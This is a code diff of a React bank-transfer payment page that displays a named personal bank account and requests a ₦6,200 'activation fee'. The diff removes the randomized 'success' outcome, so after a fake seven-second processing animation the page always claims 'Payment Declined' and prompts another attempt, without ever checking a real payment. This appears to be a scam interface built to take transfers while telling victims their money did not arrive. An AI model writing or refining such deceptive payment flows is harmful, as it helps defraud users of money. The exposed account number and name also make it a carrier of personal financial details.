@@ -1,7 +1,7 @@
 
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { ArrowLeft, Copy, Wallet, User2, Banknote, CheckCircle, AlertCircle } from "lucide-react";
+import { ArrowLeft, Copy, Wallet, User2, Banknote, AlertCircle } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { toast } from "sonner";
 import { useAuth } from "@/contexts/AuthContext";
@@ -14,26 +14,19 @@ import OpayWarningModal from "@/components/OpayWarningModal";
 const BankTransferPayment: React.FC = () => {
   const navigate = useNavigate();
   const [isLoading, setIsLoading] = useState(true);
-  const { user, updateUserInfo } = useAuth();
+  const { user } = useAuth();
   const [timeLeft, setTimeLeft] = useState(1800); // 30 mins in seconds
   const [showProcessingDialog, setShowProcessingDialog] = useState(false);
-  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
   const [showErrorDialog, setShowErrorDialog] = useState(false);
   const [showOpayWarning, setShowOpayWarning] = useState(false);
   const [buttonText, setButtonText] = useState("I Have Made Payment");
-  const [activationCode, setActivationCode] = useState("");
   const [loadingProgress, setLoadingProgress] = useState(0);
   
   const accountDetails = {
     bankName: "MONIEPOINT MFB",
     accountNumber: "6056570413",
-    accountName: "CHUKWUEMEKA AMADI",
+    accountName: "CHUKWUEMEKA AMADI JAMES",
     amount: "₦6,200"
-  };
-  
-  // Generate 6-digit activation code
-  const generateActivationCode = () => {
-    return Math.floor(100000 + Math.random() * 900000).toString();
   };
   
   // Load account details with delay
@@ -95,50 +88,12 @@ const BankTransferPayment: React.FC = () => {
       });
     }, 100);
     
-    // After 7 seconds, randomly show success or error
+    // After 7 seconds, always show error (payment declined)
     setTimeout(() => {
-      const shouldSucceed = Math.random() > 0.5; // 50% chance of success
-      
       setShowProcessingDialog(false);
-      
-      if (shouldSucceed) {
-        const newActivationCode = generateActivationCode();
-        setActivationCode(newActivationCode);
-        
-        // Debit user account and activate
-        if (user) {
-          const newBalance = user.balance - 6200;
-          updateUserInfo({ 
-            isActivated: true,
-            balance: newBalance 
-          });
-          
-          // Add transaction to history
-          const existingTransactions = JSON.parse(localStorage.getItem('transactions') || '[]');
-          const newTransaction = {
-            id: `tr-${Date.now()}`,
-            type: "debit",
-            amount: 6200,
-            date: new Date().toISOString().split('T')[0],
-            description: "Account Activation Fee",
-            status: "completed"
-          };
-          localStorage.setItem('transactions', JSON.stringify([newTransaction, ...existingTransactions]));
-        }
-        
-        setShowSuccessDialog(true);
-        toast.success("Payment confirmed! Account activated!");
-      } else {
-        // Show error dialog
-        setShowErrorDialog(true);
-        setButtonText("I Have Made Payment");
-      }
+      setShowErrorDialog(true);
+      setButtonText("I Have Made Payment");
     }, 7000);
-  };
-
-  const handleGoToDashboard = () => {
-    setShowSuccessDialog(false);
-    navigate("/dashboard");
   };
 
   const handleTryAgain = () => {
@@ -291,12 +246,11 @@ const BankTransferPayment: React.FC = () => {
         <DialogContent className="sm:max-w-md p-0 gap-0">
           <div className="p-8">
             <div className="flex flex-col items-center mb-6">
-              <div className="w-20 h-20 bg-purple-100 rounded-full flex items-center justify-center mb-6">
-                <AlertCircle size={40} className="text-purple-600" />
+              <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mb-6">
+                <AlertCircle size={40} className="text-red-600" />
               </div>
-              <h2 className="text-2xl font-bold text-center text-gray-800">Payment Not Received</h2>
-              <h3 className="text-xl font-bold text-center text-gray-800">Please Try Again</h3>
-              <p className="text-center text-gray-600 mt-3">Invalid Payment Please Try Again</p>
+              <h2 className="text-2xl font-bold text-center text-gray-800">Payment Declined</h2>
+              <p className="text-center text-gray-600 mt-3">Your payment could not be processed. Please try again later.</p>
             </div>
             
             <button
@@ -304,38 +258,6 @@ const BankTransferPayment: React.FC = () => {
               className="w-full bg-green-800 text-white py-4 rounded-lg font-medium text-lg"
             >
               TRY AGAIN
-            </button>
-          </div>
-        </DialogContent>
-      </Dialog>
-      
-      {/* Payment Success Dialog */}
-      <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
-        <DialogContent className="sm:max-w-md p-0 gap-0">
-          <div className="p-8">
-            <div className="flex flex-col items-center mb-6">
-              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-6">
-                <CheckCircle size={40} className="text-green-600" />
-              </div>
-              <h2 className="text-2xl font-bold text-center text-green-800">Payment Confirmed!</h2>
-              <p className="text-center text-gray-600 mt-3">Your account has been activated</p>
-            </div>
-            
-            <div className="bg-gray-50 p-6 rounded-lg mb-6">
-              <p className="text-sm text-gray-600 text-center mb-3">Your Activation Code</p>
-              <div className="flex justify-center">
-                <span className="text-3xl font-bold text-green-800 bg-white px-6 py-3 rounded border tracking-wider">
-                  {activationCode}
-                </span>
-              </div>
-              <p className="text-xs text-gray-500 text-center mt-3">Save this code for your records</p>
-            </div>
-            
-            <button
-              onClick={handleGoToDashboard}
-              className="w-full bg-green-800 text-white py-4 rounded-lg font-medium text-lg"
-            >
-              Go to Dashboard
             </button>
           </div>
         </DialogContent>
